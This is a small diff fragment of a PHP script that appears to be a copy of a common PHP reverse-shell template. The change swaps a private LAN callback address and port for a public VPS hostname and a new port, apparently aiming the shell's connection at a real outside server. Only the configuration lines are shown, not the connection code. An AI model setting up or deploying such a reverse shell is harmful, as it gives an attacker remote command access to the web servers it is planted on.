@@ -2,8 +2,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '192.168.1.15';  // CHANGE THIS
-$port = 4444;       // CHANGE THIS
+$ip = 'vps747586.ovh.net';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
